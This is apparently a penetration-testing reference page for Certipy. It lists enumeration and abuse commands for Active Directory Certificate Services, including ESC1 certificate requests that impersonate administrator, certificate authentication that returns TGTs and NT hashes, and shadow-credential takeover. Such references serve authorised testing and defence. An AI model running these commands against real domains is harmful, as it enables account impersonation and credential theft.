# Certipy

> A tool for enumerating and abusing Active Directory Certificate Services (AD CS) — vulnerable templates, certificate theft and shadow credentials.

- Category: Active Directory
- Commands: 6
- Page: https://terminal.rokibulroni.com/tool/active-directory/certipy
- Homepage: https://github.com/ly4k/Certipy
- Documentation: https://github.com/ly4k/Certipy
- Tags: Active Directory, AD CS, certificates, privilege escalation

## Install

- pipx: `pipx install certipy-ad`

## Enumeration

### certipy find -u <user>@<domain> -p <pass> -dc-ip <ip>

```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <ip>
```

Example:

```bash
certipy find -u svc@corp.local -p pass -dc-ip 10.10.10.1
```

Enumerates AD Certificate Services and flags vulnerable templates (ESC1–ESC16).

### certipy find -u <user>@<domain> -p <pass> -dc-ip <ip> -vulnerable -stdout

```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <ip> -vulnerable -stdout
```

Example:

```bash
certipy find -u svc@corp.local -p pass -dc-ip 10.10.10.1 -vulnerable -stdout
```

Prints only the vulnerable templates to the terminal.


## Abuse (ESC1)

### certipy req -u <user>@<domain> -p <pass> -ca <ca> -target <host> -template <tmpl> -upn <victim>

```bash
certipy req -u <user>@<domain> -p <pass> -ca <ca> -target <host> -template <tmpl> -upn <victim>
```

Example:

```bash
certipy req -u svc@corp.local -p pass -ca CORP-CA -target ca.corp.local -template VulnTemplate -upn administrator@corp.local
```

Requests a certificate as another user through a misconfigured template.

### certipy auth -pfx <file>.pfx -dc-ip <ip>

```bash
certipy auth -pfx <file>.pfx -dc-ip <ip>
```

Example:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

Authenticates with the issued certificate and returns a TGT and the NT hash.


## Shadow credentials & more

### certipy shadow auto -u <user>@<domain> -p <pass> -account <target>

```bash
certipy shadow auto -u <user>@<domain> -p <pass> -account <target>
```

Example:

```bash
certipy shadow auto -u svc@corp.local -p pass -account victim
```

Adds a Key Credential to a target account and retrieves its NT hash (needs write rights).

### certipy ca -u <user>@<domain> -p <pass> -ca <ca> -list-templates

```bash
certipy ca -u <user>@<domain> -p <pass> -ca <ca> -list-templates
```

Example:

```bash
certipy ca -u svc@corp.local -p pass -ca CORP-CA -list-templates
```

Inspects the certificate authority and its templates.

## Related tools

- [Impacket](https://terminal.rokibulroni.com/tool/active-directory/impacket)
- [BloodHound.py](https://terminal.rokibulroni.com/tool/active-directory/bloodhound-python)
- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
